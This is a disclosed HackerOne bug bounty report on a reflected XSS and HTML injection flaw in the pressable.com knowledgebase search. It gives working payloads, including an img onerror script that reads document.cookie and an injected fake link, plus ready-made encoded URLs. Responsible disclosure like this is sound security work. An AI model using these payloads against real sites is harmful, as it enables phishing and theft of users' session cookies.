# XSS and HTML Injection on the pressable.com search box

## Report Details
- **Report ID**: 1537149
- **URL**: https://hackerone.com/reports/1537149
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-04-11T09:58:06.887Z
- **Disclosed**: 2022-08-23T18:30:55.653Z

## Reporter
- **Username**: sawrav-chowdhury
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
## Summary:
Hi, I have found that search box  on pressable.com is vulnerable for XSS attack and HTML Injection .

## Steps To Reproduce:

1. Visit https://pressable.com/knowledgebase/
2. Put the payload on the search box. 

XSS Payload: "><img src=x onerror=javascript:alert(document.cookie)>

HTML Injection Payload: <h1><font Color=red>Visit  Our  New  WebSite </h1><h3><mark><a href="https://example.com">e x a m p l e . c o m </a></mark></h3>

3.XSS will be triggered /HTML Injection will be reflected.

Link with XSS Payload: [https://pressable.com/?s=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28document.cookie%29%3E&post_type=knowledgebase](https://pressable.com/?s=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28document.cookie%29%3E&post_type=knowledgebase)

Link with HTML Injection Payload: [https://pressable.com/?s=%3Ch1%3E%3Cfont+Color%3Dred%3EVisit++Our++New++WebSite+%3C%2Fh1%3E%3Ch3%3E%3Cmark%3E%3Ca+href%3D%22https%3A%2F%2Fexample.com%22%3Ee+x+a+m+p+l+e+.+c+o+m+%3C%2Fa%3E%3C%2Fmark%3E%3C%2Fh3%3E&post_type=knowledgebase](https://pressable.com/?s=%3Ch1%3E%3Cfont+Color%3Dred%3EVisit++Our++New++WebSite+%3C%2Fh1%3E%3Ch3%3E%3Cmark%3E%3Ca+href%3D%22https%3A%2F%2Fexample.com%22%3Ee+x+a+m+p+l+e+.+c+o+m+%3C%2Fa%3E%3C%2Fmark%3E%3C%2Fh3%3E&post_type=knowledgebase)

## Supporting Material/References:
POC Video Attached

## Impact

Due to these vulnerabilities, attacker can easily divert victims to their malicious site and able to get credentials of victims.

## Attachments
- POC-_VIDEO.mp4
